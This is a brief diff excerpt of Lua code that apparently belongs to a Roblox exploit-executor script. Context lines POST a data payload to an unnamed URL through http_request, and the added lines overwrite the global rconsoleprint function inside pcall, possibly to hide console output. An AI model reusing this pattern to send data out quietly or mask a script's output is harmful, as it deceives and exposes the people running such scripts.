@@ -97,3 +97,6 @@ local data =
     local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
     http_request(request_payload)
 end
+pcall(function()
+    getgenv().rconsoleprint = g
+    end) 
